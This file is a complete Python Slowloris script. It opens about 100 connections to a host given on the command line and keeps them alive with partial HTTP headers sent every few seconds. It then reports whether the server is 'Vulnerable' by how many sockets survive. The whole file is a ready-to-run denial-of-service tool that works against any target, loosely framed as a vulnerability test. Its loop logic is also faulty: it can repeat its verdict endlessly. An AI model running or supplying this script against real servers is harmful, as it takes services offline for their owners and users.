import socket
import random
import time
import sys

count = 1

list_of_sockets = []

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

target = sys.argv[1]
socket_count = 100
print("Attacking {} with {} sockets\n".format(target, socket_count))

print("Creating sockets...")
for i in range(socket_count):
    try:
        print("\rCreating socket number {}".format(i),end='')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, 80))
    except socket.error:
        break
    list_of_sockets.append(s)

print("\nSetting up the sockets...\n\n")
for s in list_of_sockets:
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    for header in regular_headers:
        s.send(bytes("{}\r\n".format(header).encode("utf-8")))

while True:
    print("\rSending body set number %s. There are %s sockets still live..."%(count,len(list_of_sockets)),end="")
    for s in list_of_sockets:
        try:
            s.send(bytes("X-a: {}".format(random.randint(1, 5000)).encode("utf-8")))
        except socket.error:
            list_of_sockets.remove(s)

    if count == 80:
        print(f"\n\nSlowloris attack carried out with 80 body segments sent over 4 minutes. \n%i of an original 100 sockets were still alive after this time. \u001b[31mConclusion: Vulnerable.\u001b[0m\n\n"%(len(list_of_sockets)))
    elif len(list_of_sockets) != 0:
        count += 1
        time.sleep(3)
    elif count > 30:
        print(f"\n\nSlowloris attack carried out, and the server timed all sockets out only afer %i of an attempted 80 body segments were sent. \u001b[31mConclusion: Potentially Vulnerable.\u001b[0m\n\n"%(count))
    else:
        print('\nSlowloris attack failed after %i body segments sent.'%count)
        break
